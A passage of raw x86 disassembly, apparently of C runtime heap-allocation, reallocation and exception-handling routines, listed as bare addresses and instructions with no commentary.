  4251df:	and    DWORD PTR [ecx],ebx
  4251e1:	jmp    0x425202
  4251e3:	add    ecx,0xffffffe0
  4251e6:	shr    ebx,cl
  4251e8:	mov    ecx,DWORD PTR [ebp-0x8]
  4251eb:	lea    ecx,[ecx+eax*1+0x4]
  4251ef:	not    ebx
  4251f1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4251f8:	dec    BYTE PTR [ecx]
  4251fa:	jne    0x425202
  4251fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4251ff:	and    DWORD PTR [ecx+0x4],ebx
  425202:	mov    ecx,DWORD PTR [edi+0x8]
  425205:	mov    ebx,DWORD PTR [edi+0x4]
  425208:	mov    DWORD PTR [ecx+0x4],ebx
  42520b:	mov    ecx,DWORD PTR [edi+0x4]
  42520e:	mov    edi,DWORD PTR [edi+0x8]
  425211:	mov    DWORD PTR [ecx+0x8],edi
  425214:	mov    ecx,DWORD PTR [ebp+0x10]
  425217:	sub    ecx,esi
  425219:	add    DWORD PTR [ebp-0x4],ecx
  42521c:	cmp    DWORD PTR [ebp-0x4],0x0
  425220:	jle    0x4252cb
  425226:	mov    edi,DWORD PTR [ebp-0x4]
  425229:	mov    ecx,DWORD PTR [ebp+0xc]
  42522c:	sar    edi,0x4
  42522f:	dec    edi
  425230:	cmp    edi,0x3f
  425233:	lea    ecx,[ecx+esi*1-0x4]
  425237:	jbe    0x42523c
  425239:	push   0x3f
  42523b:	pop    edi
  42523c:	mov    ebx,DWORD PTR [ebp-0xc]
  42523f:	lea    ebx,[ebx+edi*8]
  425242:	mov    DWORD PTR [ebp+0x10],ebx
  425245:	mov    ebx,DWORD PTR [ebx+0x4]
  425248:	mov    DWORD PTR [ecx+0x4],ebx
  42524b:	mov    ebx,DWORD PTR [ebp+0x10]
  42524e:	mov    DWORD PTR [ecx+0x8],ebx
  425251:	mov    DWORD PTR [ebx+0x4],ecx
  425254:	mov    ebx,DWORD PTR [ecx+0x4]
  425257:	mov    DWORD PTR [ebx+0x8],ecx
  42525a:	mov    ebx,DWORD PTR [ecx+0x4]
  42525d:	cmp    ebx,DWORD PTR [ecx+0x8]
  425260:	jne    0x4252b9
  425262:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  425266:	mov    BYTE PTR [ebp+0x13],cl
  425269:	inc    cl
  42526b:	cmp    edi,0x20
  42526e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  425272:	jae    0x425290
  425274:	cmp    BYTE PTR [ebp+0x13],0x0
  425278:	jne    0x425288
  42527a:	mov    ecx,edi
  42527c:	mov    ebx,0x80000000
  425281:	shr    ebx,cl
  425283:	mov    ecx,DWORD PTR [ebp+0x8]
  425286:	or     DWORD PTR [ecx],ebx
  425288:	lea    eax,[eax+edx*4+0x44]
  42528c:	mov    ecx,edi
  42528e:	jmp    0x4252b0
  425290:	cmp    BYTE PTR [ebp+0x13],0x0
  425294:	jne    0x4252a6
  425296:	lea    ecx,[edi-0x20]
  425299:	mov    ebx,0x80000000
  42529e:	shr    ebx,cl
  4252a0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252a3:	or     DWORD PTR [ecx+0x4],ebx
  4252a6:	lea    eax,[eax+edx*4+0xc4]
  4252ad:	lea    ecx,[edi-0x20]
  4252b0:	mov    edx,0x80000000
  4252b5:	shr    edx,cl
  4252b7:	or     DWORD PTR [eax],edx
  4252b9:	mov    edx,DWORD PTR [ebp+0xc]
  4252bc:	mov    ecx,DWORD PTR [ebp-0x4]
  4252bf:	lea    eax,[edx+esi*1-0x4]
  4252c3:	mov    DWORD PTR [eax],ecx
  4252c5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  4252c9:	jmp    0x4252ce
  4252cb:	mov    edx,DWORD PTR [ebp+0xc]
  4252ce:	lea    eax,[esi+0x1]
  4252d1:	mov    DWORD PTR [edx-0x4],eax
  4252d4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  4252d8:	jmp    0x425419
  4252dd:	xor    eax,eax
  4252df:	jmp    0x42541c
  4252e4:	jge    0x425419
  4252ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4252ed:	sub    DWORD PTR [ebp+0x10],esi
  4252f0:	lea    ecx,[esi+0x1]
  4252f3:	mov    DWORD PTR [ebx-0x4],ecx
  4252f6:	lea    ebx,[ebx+esi*1-0x4]
  4252fa:	mov    esi,DWORD PTR [ebp+0x10]
  4252fd:	sar    esi,0x4
  425300:	dec    esi
  425301:	cmp    esi,0x3f
  425304:	mov    DWORD PTR [ebp+0xc],ebx
  425307:	mov    DWORD PTR [ebx-0x4],ecx
  42530a:	jbe    0x42530f
  42530c:	push   0x3f
  42530e:	pop    esi
  42530f:	test   BYTE PTR [ebp-0x4],0x1
  425313:	jne    0x425399
  425319:	mov    esi,DWORD PTR [ebp-0x4]
  42531c:	sar    esi,0x4
  42531f:	dec    esi
  425320:	cmp    esi,0x3f
  425323:	jbe    0x425328
  425325:	push   0x3f
  425327:	pop    esi
  425328:	mov    ecx,DWORD PTR [edi+0x4]
  42532b:	cmp    ecx,DWORD PTR [edi+0x8]
  42532e:	jne    0x425372
  425330:	cmp    esi,0x20
  425333:	mov    ebx,0x80000000
  425338:	jae    0x425353
  42533a:	mov    ecx,esi
  42533c:	shr    ebx,cl
  42533e:	lea    esi,[esi+eax*1+0x4]
  425342:	not    ebx
  425344:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425348:	dec    BYTE PTR [esi]
  42534a:	jne    0x42536f
  42534c:	mov    ecx,DWORD PTR [ebp+0x8]
  42534f:	and    DWORD PTR [ecx],ebx
  425351:	jmp    0x42536f
  425353:	lea    ecx,[esi-0x20]
  425356:	shr    ebx,cl
  425358:	lea    ecx,[esi+eax*1+0x4]
  42535c:	not    ebx
  42535e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425365:	dec    BYTE PTR [ecx]
  425367:	jne    0x42536f
  425369:	mov    ecx,DWORD PTR [ebp+0x8]
  42536c:	and    DWORD PTR [ecx+0x4],ebx
  42536f:	mov    ebx,DWORD PTR [ebp+0xc]
  425372:	mov    ecx,DWORD PTR [edi+0x8]
  425375:	mov    esi,DWORD PTR [edi+0x4]
  425378:	mov    DWORD PTR [ecx+0x4],esi
  42537b:	mov    esi,DWORD PTR [edi+0x8]
  42537e:	mov    ecx,DWORD PTR [edi+0x4]
  425381:	mov    DWORD PTR [ecx+0x8],esi
  425384:	mov    esi,DWORD PTR [ebp+0x10]
  425387:	add    esi,DWORD PTR [ebp-0x4]
  42538a:	mov    DWORD PTR [ebp+0x10],esi
  42538d:	sar    esi,0x4
  425390:	dec    esi
  425391:	cmp    esi,0x3f
  425394:	jbe    0x425399
  425396:	push   0x3f
  425398:	pop    esi
  425399:	mov    ecx,DWORD PTR [ebp-0xc]
  42539c:	lea    ecx,[ecx+esi*8]
  42539f:	mov    edi,DWORD PTR [ecx+0x4]
  4253a2:	mov    DWORD PTR [ebx+0x8],ecx
  4253a5:	mov    DWORD PTR [ebx+0x4],edi
  4253a8:	mov    DWORD PTR [ecx+0x4],ebx
  4253ab:	mov    ecx,DWORD PTR [ebx+0x4]
  4253ae:	mov    DWORD PTR [ecx+0x8],ebx
  4253b1:	mov    ecx,DWORD PTR [ebx+0x4]
  4253b4:	cmp    ecx,DWORD PTR [ebx+0x8]
  4253b7:	jne    0x425410
  4253b9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4253bd:	mov    BYTE PTR [ebp+0xf],cl
  4253c0:	inc    cl
  4253c2:	cmp    esi,0x20
  4253c5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4253c9:	jae    0x4253e7
  4253cb:	cmp    BYTE PTR [ebp+0xf],0x0
  4253cf:	jne    0x4253df
  4253d1:	mov    ecx,esi
  4253d3:	mov    edi,0x80000000
  4253d8:	shr    edi,cl
  4253da:	mov    ecx,DWORD PTR [ebp+0x8]
  4253dd:	or     DWORD PTR [ecx],edi
  4253df:	lea    eax,[eax+edx*4+0x44]
  4253e3:	mov    ecx,esi
  4253e5:	jmp    0x425407
  4253e7:	cmp    BYTE PTR [ebp+0xf],0x0
  4253eb:	jne    0x4253fd
  4253ed:	lea    ecx,[esi-0x20]
  4253f0:	mov    edi,0x80000000
  4253f5:	shr    edi,cl
  4253f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4253fa:	or     DWORD PTR [ecx+0x4],edi
  4253fd:	lea    eax,[eax+edx*4+0xc4]
  425404:	lea    ecx,[esi-0x20]
  425407:	mov    edx,0x80000000
  42540c:	shr    edx,cl
  42540e:	or     DWORD PTR [eax],edx
  425410:	mov    eax,DWORD PTR [ebp+0x10]
  425413:	mov    DWORD PTR [ebx],eax
  425415:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425419:	xor    eax,eax
  42541b:	inc    eax
  42541c:	pop    edi
  42541d:	pop    esi
  42541e:	pop    ebx
  42541f:	leave  
  425420:	ret    
  425421:	push   ebp
  425422:	mov    ebp,esp
  425424:	sub    esp,0x14
  425427:	mov    ecx,DWORD PTR [ebp+0x8]
  42542a:	mov    eax,ds:0x45cefc
  42542f:	mov    edx,DWORD PTR ds:0x45cf00
  425435:	add    ecx,0x17
  425438:	and    ecx,0xfffffff0
  42543b:	push   ebx
  42543c:	mov    DWORD PTR [ebp-0x10],ecx
  42543f:	sar    ecx,0x4
  425442:	push   esi
  425443:	lea    eax,[eax+eax*4]
  425446:	push   edi
  425447:	dec    ecx
  425448:	cmp    ecx,0x20
  42544b:	lea    edi,[edx+eax*4]
  42544e:	mov    DWORD PTR [ebp-0x4],edi
  425451:	jge    0x42545e
  425453:	or     esi,0xffffffff
  425456:	shr    esi,cl
  425458:	or     DWORD PTR [ebp-0x8],0xffffffff
  42545c:	jmp    0x42546b
  42545e:	add    ecx,0xffffffe0
  425461:	or     eax,0xffffffff
  425464:	xor    esi,esi
  425466:	shr    eax,cl
  425468:	mov    DWORD PTR [ebp-0x8],eax
  42546b:	mov    eax,ds:0x45cf08
  425470:	mov    ebx,eax
  425472:	mov    DWORD PTR [ebp-0xc],esi
  425475:	cmp    ebx,edi
  425477:	jmp    0x42548d
  425479:	mov    ecx,DWORD PTR [ebx+0x4]
  42547c:	mov    edi,DWORD PTR [ebx]
  42547e:	and    ecx,DWORD PTR [ebp-0x8]
  425481:	and    edi,esi
  425483:	or     ecx,edi
  425485:	jne    0x425492
  425487:	add    ebx,0x14
  42548a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42548d:	mov    DWORD PTR [ebp+0x8],ebx
  425490:	jb     0x425479
  425492:	cmp    ebx,DWORD PTR [ebp-0x4]
  425495:	jne    0x4254bb
  425497:	mov    ebx,edx
  425499:	jmp    0x4254ac
  42549b:	mov    ecx,DWORD PTR [ebx+0x4]
  42549e:	mov    edi,DWORD PTR [ebx]
  4254a0:	and    ecx,DWORD PTR [ebp-0x8]
  4254a3:	and    edi,esi
  4254a5:	or     ecx,edi
  4254a7:	jne    0x4254b3
  4254a9:	add    ebx,0x14
  4254ac:	cmp    ebx,eax
  4254ae:	mov    DWORD PTR [ebp+0x8],ebx
  4254b1:	jb     0x42549b
  4254b3:	cmp    ebx,eax
  4254b5:	je     0x42554f
  4254bb:	mov    DWORD PTR ds:0x45cf08,ebx
  4254c1:	mov    eax,DWORD PTR [ebx+0x10]
  4254c4:	mov    edx,DWORD PTR [eax]
  4254c6:	cmp    edx,0xffffffff
  4254c9:	mov    DWORD PTR [ebp-0x4],edx
  4254cc:	je     0x4254e2
  4254ce:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4254d5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4254d9:	and    ecx,DWORD PTR [ebp-0x8]
  4254dc:	and    edi,esi
  4254de:	or     ecx,edi
  4254e0:	jne    0x425518
  4254e2:	mov    edx,DWORD PTR [eax+0xc4]
  4254e8:	and    edx,DWORD PTR [ebp-0x8]
  4254eb:	and    DWORD PTR [ebp-0x4],0x0
  4254ef:	lea    ecx,[eax+0x44]
  4254f2:	mov    esi,DWORD PTR [ecx]
  4254f4:	and    esi,DWORD PTR [ebp-0xc]
  4254f7:	or     edx,esi
  4254f9:	mov    esi,DWORD PTR [ebp-0xc]
  4254fc:	jne    0x425515
  4254fe:	mov    edx,DWORD PTR [ecx+0x84]
  425504:	and    edx,DWORD PTR [ebp-0x8]
  425507:	inc    DWORD PTR [ebp-0x4]
  42550a:	add    ecx,0x4
  42550d:	mov    edi,DWORD PTR [ecx]
  42550f:	and    edi,esi
  425511:	or     edx,edi
  425513:	je     0x4254fe
  425515:	mov    edx,DWORD PTR [ebp-0x4]
  425518:	mov    ecx,edx
  42551a:	imul   ecx,ecx,0x204
  425520:	lea    ecx,[ecx+eax*1+0x144]
  425527:	mov    DWORD PTR [ebp-0xc],ecx
  42552a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42552e:	xor    edi,edi
  425530:	and    ecx,esi
  425532:	jne    0x4255a1
  425534:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42553b:	and    ecx,DWORD PTR [ebp-0x8]
  42553e:	push   0x20
  425540:	pop    edi
  425541:	jmp    0x4255a1
  425543:	cmp    DWORD PTR [ebx+0x8],0x0
  425547:	jne    0x425554
  425549:	add    ebx,0x14
  42554c:	mov    DWORD PTR [ebp+0x8],ebx
  42554f:	cmp    ebx,DWORD PTR [ebp-0x4]
  425552:	jb     0x425543
  425554:	cmp    ebx,DWORD PTR [ebp-0x4]
  425557:	jne    0x42557f
  425559:	mov    ebx,edx
  42555b:	jmp    0x425566
  42555d:	cmp    DWORD PTR [ebx+0x8],0x0
  425561:	jne    0x42556d
  425563:	add    ebx,0x14
  425566:	cmp    ebx,eax
  425568:	mov    DWORD PTR [ebp+0x8],ebx
  42556b:	jb     0x42555d
  42556d:	cmp    ebx,eax
  42556f:	jne    0x42557f
  425571:	call   0x424f85
  425576:	mov    ebx,eax
  425578:	test   ebx,ebx
  42557a:	mov    DWORD PTR [ebp+0x8],ebx
  42557d:	je     0x425597
  42557f:	push   ebx
  425580:	call   0x42503c
  425585:	pop    ecx
  425586:	mov    ecx,DWORD PTR [ebx+0x10]
  425589:	mov    DWORD PTR [ecx],eax
  42558b:	mov    eax,DWORD PTR [ebx+0x10]
  42558e:	cmp    DWORD PTR [eax],0xffffffff
  425591:	jne    0x4254bb
  425597:	xor    eax,eax
  425599:	jmp    0x425718
  42559e:	shl    ecx,1
  4255a0:	inc    edi
  4255a1:	test   ecx,ecx
  4255a3:	jge    0x42559e
  4255a5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255a8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255ac:	mov    ecx,DWORD PTR [edx]
  4255ae:	sub    ecx,DWORD PTR [ebp-0x10]
  4255b1:	mov    esi,ecx
  4255b3:	sar    esi,0x4
  4255b6:	dec    esi
  4255b7:	cmp    esi,0x3f
  4255ba:	mov    DWORD PTR [ebp-0x8],ecx
  4255bd:	jle    0x4255c2
  4255bf:	push   0x3f
  4255c1:	pop    esi
  4255c2:	cmp    esi,edi
  4255c4:	je     0x4256cb
  4255ca:	mov    ecx,DWORD PTR [edx+0x4]
  4255cd:	cmp    ecx,DWORD PTR [edx+0x8]
  4255d0:	jne    0x42562e
  4255d2:	cmp    edi,0x20
  4255d5:	mov    ebx,0x80000000
  4255da:	jge    0x425602
  4255dc:	mov    ecx,edi
  4255de:	shr    ebx,cl
  4255e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4255e3:	lea    edi,[eax+edi*1+0x4]
  4255e7:	not    ebx
  4255e9:	mov    DWORD PTR [ebp-0x14],ebx
  4255ec:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4255f0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4255f4:	dec    BYTE PTR [edi]
  4255f6:	jne    0x42562b
  4255f8:	mov    ecx,DWORD PTR [ebp-0x14]
  4255fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4255fe:	and    DWORD PTR [ebx],ecx
  425600:	jmp    0x42562e
  425602:	lea    ecx,[edi-0x20]
  425605:	shr    ebx,cl
  425607:	mov    ecx,DWORD PTR [ebp-0x4]
  42560a:	lea    ecx,[eax+ecx*4+0xc4]
  425611:	lea    edi,[eax+edi*1+0x4]
  425615:	not    ebx
  425617:	and    DWORD PTR [ecx],ebx
  425619:	dec    BYTE PTR [edi]
  42561b:	mov    DWORD PTR [ebp-0x14],ebx
  42561e:	jne    0x42562b
  425620:	mov    ebx,DWORD PTR [ebp+0x8]
  425623:	mov    ecx,DWORD PTR [ebp-0x14]
  425626:	and    DWORD PTR [ebx+0x4],ecx
  425629:	jmp    0x42562e
  42562b:	mov    ebx,DWORD PTR [ebp+0x8]
  42562e:	cmp    DWORD PTR [ebp-0x8],0x0
  425632:	mov    ecx,DWORD PTR [edx+0x8]
  425635:	mov    edi,DWORD PTR [edx+0x4]
  425638:	mov    DWORD PTR [ecx+0x4],edi
  42563b:	mov    ecx,DWORD PTR [edx+0x4]
  42563e:	mov    edi,DWORD PTR [edx+0x8]
  425641:	mov    DWORD PTR [ecx+0x8],edi
  425644:	je     0x4256d7
  42564a:	mov    ecx,DWORD PTR [ebp-0xc]
  42564d:	lea    ecx,[ecx+esi*8]
  425650:	mov    edi,DWORD PTR [ecx+0x4]
  425653:	mov    DWORD PTR [edx+0x8],ecx
  425656:	mov    DWORD PTR [edx+0x4],edi
  425659:	mov    DWORD PTR [ecx+0x4],edx
  42565c:	mov    ecx,DWORD PTR [edx+0x4]
  42565f:	mov    DWORD PTR [ecx+0x8],edx
  425662:	mov    ecx,DWORD PTR [edx+0x4]
  425665:	cmp    ecx,DWORD PTR [edx+0x8]
  425668:	jne    0x4256c8
  42566a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42566e:	mov    BYTE PTR [ebp+0xb],cl
  425671:	inc    cl
  425673:	cmp    esi,0x20
  425676:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42567a:	jge    0x42569f
  42567c:	cmp    BYTE PTR [ebp+0xb],0x0
  425680:	jne    0x42568d
  425682:	mov    edi,0x80000000
  425687:	mov    ecx,esi
  425689:	shr    edi,cl
  42568b:	or     DWORD PTR [ebx],edi
  42568d:	mov    ecx,esi
  42568f:	mov    edi,0x80000000
  425694:	shr    edi,cl
  425696:	mov    ecx,DWORD PTR [ebp-0x4]
  425699:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42569d:	jmp    0x4256c8
  42569f:	cmp    BYTE PTR [ebp+0xb],0x0
  4256a3:	jne    0x4256b2
  4256a5:	lea    ecx,[esi-0x20]
  4256a8:	mov    edi,0x80000000
  4256ad:	shr    edi,cl
  4256af:	or     DWORD PTR [ebx+0x4],edi
  4256b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4256b5:	lea    edi,[eax+ecx*4+0xc4]
  4256bc:	lea    ecx,[esi-0x20]
  4256bf:	mov    esi,0x80000000
  4256c4:	shr    esi,cl
  4256c6:	or     DWORD PTR [edi],esi
  4256c8:	mov    ecx,DWORD PTR [ebp-0x8]
  4256cb:	test   ecx,ecx
  4256cd:	je     0x4256da
  4256cf:	mov    DWORD PTR [edx],ecx
  4256d1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4256d5:	jmp    0x4256da
  4256d7:	mov    ecx,DWORD PTR [ebp-0x8]
  4256da:	mov    esi,DWORD PTR [ebp-0x10]
  4256dd:	add    edx,ecx
  4256df:	lea    ecx,[esi+0x1]
  4256e2:	mov    DWORD PTR [edx],ecx
  4256e4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4256e8:	mov    esi,DWORD PTR [ebp-0xc]
  4256eb:	mov    ecx,DWORD PTR [esi]
  4256ed:	test   ecx,ecx
  4256ef:	lea    edi,[ecx+0x1]
  4256f2:	mov    DWORD PTR [esi],edi
  4256f4:	jne    0x425710
  4256f6:	cmp    ebx,DWORD PTR ds:0x45cef8
  4256fc:	jne    0x425710
  4256fe:	mov    ecx,DWORD PTR [ebp-0x4]
  425701:	cmp    ecx,DWORD PTR ds:0x45cf10
  425707:	jne    0x425710
  425709:	and    DWORD PTR ds:0x45cef8,0x0
  425710:	mov    ecx,DWORD PTR [ebp-0x4]
  425713:	mov    DWORD PTR [eax],ecx
  425715:	lea    eax,[edx+0x4]
  425718:	pop    edi
  425719:	pop    esi
  42571a:	pop    ebx
  42571b:	leave  
  42571c:	ret    
  42571d:	int3   
  42571e:	int3   
  42571f:	int3   
  425720:	push   esi
  425721:	inc    ebx
  425722:	xor    dh,BYTE PTR [eax]
  425724:	pop    eax
  425725:	inc    ebx
  425726:	xor    BYTE PTR [eax],dh
  425728:	push   ebp
  425729:	mov    ebp,esp
  42572b:	sub    esp,0x8
  42572e:	push   ebx
  42572f:	push   esi
  425730:	push   edi
  425731:	push   ebp
  425732:	cld    
  425733:	mov    ebx,DWORD PTR [ebp+0xc]
  425736:	mov    eax,DWORD PTR [ebp+0x8]
  425739:	test   DWORD PTR [eax+0x4],0x6
  425740:	jne    0x4257c8
  425746:	mov    DWORD PTR [ebp-0x8],eax
  425749:	mov    eax,DWORD PTR [ebp+0x10]
  42574c:	mov    DWORD PTR [ebp-0x4],eax
  42574f:	lea    eax,[ebp-0x8]
  425752:	mov    DWORD PTR [ebx-0x4],eax
  425755:	mov    esi,DWORD PTR [ebx+0xc]
  425758:	mov    edi,DWORD PTR [ebx+0x8]
  42575b:	cmp    esi,0xffffffff
  42575e:	je     0x4257c1
  425760:	lea    ecx,[esi+esi*2]
  425763:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  425768:	je     0x4257af
  42576a:	push   esi
  42576b:	push   ebp
  42576c:	lea    ebp,[ebx+0x10]
  42576f:	call   DWORD PTR [edi+ecx*4+0x4]
  425773:	pop    ebp
  425774:	pop    esi
  425775:	mov    ebx,DWORD PTR [ebp+0xc]
  425778:	or     eax,eax
  42577a:	je     0x4257af
  42577c:	js     0x4257ba
  42577e:	mov    edi,DWORD PTR [ebx+0x8]
  425781:	push   ebx
  425782:	call   0x4266b0
  425787:	add    esp,0x4
  42578a:	lea    ebp,[ebx+0x10]
  42578d:	push   esi
  42578e:	push   ebx
  42578f:	call   0x4266f2
  425794:	add    esp,0x8
  425797:	lea    ecx,[esi+esi*2]
  42579a:	push   0x1
  42579c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257a0:	call   0x426786
  4257a5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257a8:	mov    DWORD PTR [ebx+0xc],eax
  4257ab:	call   DWORD PTR [edi+ecx*4+0x8]
  4257af:	mov    edi,DWORD PTR [ebx+0x8]
  4257b2:	lea    ecx,[esi+esi*2]
  4257b5:	mov    esi,DWORD PTR [edi+ecx*4]
  4257b8:	jmp    0x42575b
  4257ba:	mov    eax,0x0
  4257bf:	jmp    0x4257dd
  4257c1:	mov    eax,0x1
  4257c6:	jmp    0x4257dd
  4257c8:	push   ebp
  4257c9:	lea    ebp,[ebx+0x10]
  4257cc:	push   0xffffffff
  4257ce:	push   ebx
  4257cf:	call   0x4266f2
  4257d4:	add    esp,0x8
  4257d7:	pop    ebp
  4257d8:	mov    eax,0x1
  4257dd:	pop    ebp
  4257de:	pop    edi
  4257df:	pop    esi
  4257e0:	pop    ebx
  4257e1:	mov    esp,ebp
  4257e3:	pop    ebp
  4257e4:	ret    
  4257e5:	push   ebp
  4257e6:	mov    ecx,DWORD PTR [esp+0x8]
  4257ea:	mov    ebp,DWORD PTR [ecx]
  4257ec:	mov    eax,DWORD PTR [ecx+0x1c]
  4257ef:	push   eax
  4257f0:	mov    eax,DWORD PTR [ecx+0x18]
  4257f3:	push   eax
  4257f4:	call   0x4266f2
  4257f9:	add    esp,0x8
  4257fc:	pop    ebp
  4257fd:	ret    0x4
  425800:	call   0x42370d
  425805:	add    eax,0x8
  425808:	ret    
  425809:	push   0x14
  42580b:	push   0x428768
  425810:	call   0x423858
  425815:	mov    edi,DWORD PTR [ebp+0x8]
  425818:	xor    ebx,ebx
  42581a:	cmp    edi,ebx
  42581c:	jne    0x42582c
  42581e:	push   DWORD PTR [ebp+0xc]
  425821:	call   0x424582
  425826:	pop    ecx
  425827:	jmp    0x4259b0
  42582c:	mov    esi,DWORD PTR [ebp+0xc]
  42582f:	cmp    esi,ebx
  425831:	jne    0x42583f
  425833:	push   edi
  425834:	call   0x42446a
  425839:	pop    ecx
  42583a:	jmp    0x4259ae
  42583f:	cmp    DWORD PTR ds:0x45d144,0x3
  425846:	jne    0x42597a
  42584c:	mov    DWORD PTR [ebp-0x1c],ebx
  42584f:	cmp    esi,0xffffffe0
  425852:	ja     0x425949
  425858:	push   0x4
  42585a:	call   0x423a1f
  42585f:	pop    ecx
  425860:	mov    DWORD PTR [ebp-0x4],ebx
  425863:	push   edi
  425864:	call   0x424c42
  425869:	pop    ecx
  42586a:	mov    DWORD PTR [ebp-0x20],eax
  42586d:	cmp    eax,ebx
  42586f:	je     0x425919
  425875:	cmp    esi,DWORD PTR ds:0x45cf04
  42587b:	ja     0x4258c9
  42587d:	push   esi
  42587e:	push   edi
  42587f:	push   eax
  425880:	call   0x425142
  425885:	add    esp,0xc
  425888:	test   eax,eax
  42588a:	je     0x425891
  42588c:	mov    DWORD PTR [ebp-0x1c],edi
  42588f:	jmp    0x4258c9
  425891:	push   esi
  425892:	call   0x425421
  425897:	pop    ecx
  425898:	mov    DWORD PTR [ebp-0x1c],eax
  42589b:	cmp    eax,ebx
  42589d:	je     0x4258c9
  42589f:	mov    eax,DWORD PTR [edi-0x4]
  4258a2:	dec    eax
  4258a3:	mov    DWORD PTR [ebp-0x24],eax
  4258a6:	cmp    eax,esi
  4258a8:	jb     0x4258ac
  4258aa:	mov    eax,esi
  4258ac:	push   eax
  4258ad:	push   edi
  4258ae:	push   DWORD PTR [ebp-0x1c]
  4258b1:	call   0x4245a0
  4258b6:	push   edi
  4258b7:	call   0x424c42
  4258bc:	mov    DWORD PTR [ebp-0x20],eax
  4258bf:	push   edi
  4258c0:	push   eax
  4258c1:	call   0x424c6d
  4258c6:	add    esp,0x18
  4258c9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4258cc:	jne    0x425919
  4258ce:	cmp    esi,ebx
  4258d0:	jne    0x4258d8
  4258d2:	xor    esi,esi
  4258d4:	inc    esi
  4258d5:	mov    DWORD PTR [ebp+0xc],esi
  4258d8:	add    esi,0xf
  4258db:	and    esi,0xfffffff0
  4258de:	mov    DWORD PTR [ebp+0xc],esi
  4258e1:	push   esi
  4258e2:	push   ebx
  4258e3:	push   DWORD PTR ds:0x45d140
  4258e9:	call   DWORD PTR ds:0x4280a4
  4258ef:	mov    DWORD PTR [ebp-0x1c],eax
  4258f2:	cmp    eax,ebx
  4258f4:	je     0x425919
  4258f6:	mov    eax,DWORD PTR [edi-0x4]
  4258f9:	dec    eax
  4258fa:	mov    DWORD PTR [ebp-0x24],eax
  4258fd:	cmp    eax,esi
  4258ff:	jb     0x425903
  425901:	mov    eax,esi
  425903:	push   eax
  425904:	push   edi
  425905:	push   DWORD PTR [ebp-0x1c]
  425908:	call   0x4245a0
  42590d:	push   edi
  42590e:	push   DWORD PTR [ebp-0x20]
  425911:	call   0x424c6d
  425916:	add    esp,0x14
  425919:	or     DWORD PTR [ebp-0x4],0xffffffff
  42591d:	call   0x425971
  425922:	cmp    DWORD PTR [ebp-0x20],ebx
  425925:	jne    0x425949
  425927:	cmp    esi,ebx
  425929:	jne    0x42592e
  42592b:	xor    esi,esi
  42592d:	inc    esi
  42592e:	add    esi,0xf
  425931:	and    esi,0xfffffff0
  425934:	mov    DWORD PTR [ebp+0xc],esi
  425937:	push   esi
  425938:	push   edi
  425939:	push   ebx
  42593a:	push   DWORD PTR ds:0x45d140
  425940:	call   DWORD PTR ds:0x4280b0
  425946:	mov    DWORD PTR [ebp-0x1c],eax
  425949:	mov    eax,DWORD PTR [ebp-0x1c]
  42594c:	cmp    eax,ebx
  42594e:	jne    0x4259b0
  425950:	cmp    DWORD PTR ds:0x45cdc8,ebx
  425956:	je     0x4259b0
  425958:	push   esi
  425959:	call   0x426142
  42595e:	pop    ecx
  42595f:	test   eax,eax
  425961:	jne    0x42584c
  425967:	jmp    0x4259ae
  425969:	xor    ebx,ebx
  42596b:	mov    esi,DWORD PTR [ebp+0xc]
  42596e:	mov    edi,DWORD PTR [ebp+0x8]
  425971:	push   0x4
  425973:	call   0x42398b
  425978:	pop    ecx
  425979:	ret    
  42597a:	xor    eax,eax
  42597c:	cmp    esi,0xffffffe0
  42597f:	ja     0x425997
  425981:	cmp    esi,ebx
  425983:	jne    0x425988
  425985:	xor    esi,esi
  425987:	inc    esi
  425988:	push   esi
  425989:	push   edi
  42598a:	push   ebx
  42598b:	push   DWORD PTR ds:0x45d140
  425991:	call   DWORD PTR ds:0x4280b0
  425997:	cmp    eax,ebx
  425999:	jne    0x4259b0
  42599b:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a1:	je     0x4259b0
  4259a3:	push   esi
  4259a4:	call   0x426142
  4259a9:	pop    ecx
  4259aa:	test   eax,eax
  4259ac:	jne    0x42597a
  4259ae:	xor    eax,eax
  4259b0:	call   0x423893
  4259b5:	ret    
  4259b6:	push   0x10
  4259b8:	push   0x428778
  4259bd:	call   0x423858
  4259c2:	cmp    DWORD PTR ds:0x45d144,0x3
  4259c9:	jne    0x425a05
  4259cb:	push   0x4
  4259cd:	call   0x423a1f
  4259d2:	pop    ecx
  4259d3:	and    DWORD PTR [ebp-0x4],0x0
  4259d7:	mov    esi,DWORD PTR [ebp+0x8]
  4259da:	push   esi
  4259db:	call   0x424c42
  4259e0:	pop    ecx
  4259e1:	mov    DWORD PTR [ebp-0x1c],eax
  4259e4:	test   eax,eax
  4259e6:	je     0x4259f3
